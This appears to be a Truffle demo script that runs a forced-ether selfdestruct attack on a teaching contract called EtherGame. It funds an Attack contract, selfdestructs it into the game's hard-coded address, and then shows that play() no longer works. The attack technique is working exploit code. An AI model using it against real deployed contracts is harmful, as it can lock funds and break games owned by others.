const EtherGame = artifacts.require("EtherGame")
const Attack = artifacts.require("Attack")


module.exports = async function main(callback) {
  try {
    const accounts = await web3.eth.getAccounts();
    const attack = await Attack.deployed()
    const game = await EtherGame.deployed()

    // console.log(accounts[0])
    // console.log("Account0 balance:", await web3.eth.getBalance(accounts[0]))
    // console.log(game)
    // console.log(attack)

    // send some ether (>= 10 ETH) to the attack contract
    console.log("Sending 10 ETH to Attack contract")
    await attack.send(web3.utils.toWei("10", "ether"))
    .then(function(result) {
      // Code goes here
    })

    const attackBalance = (await attack.getBalance()).toString()
    console.log("Attack contract balance: ", attackBalance)

    console.log("Selfdestruct Attack contract...")
    // call destruct() in Attack contract with EtherGame contract address passed as argument
    await attack.destruct("0xCfEB869F69431e42cdB54A4F4f105C19C080A601")

    console.log("Sending 0.5 ETH to EtherGame contract")
    // call play() in EtherGame contract by sending 0.5 ETH
    // should not able to receive anymore ETH due to unexpected ether attack
    await game.play({
      value: web3.utils.toWei("0.5", "ether")
    })

    callback(0);
  } catch (error) {
    console.error(error);
    callback(1);
  }
};
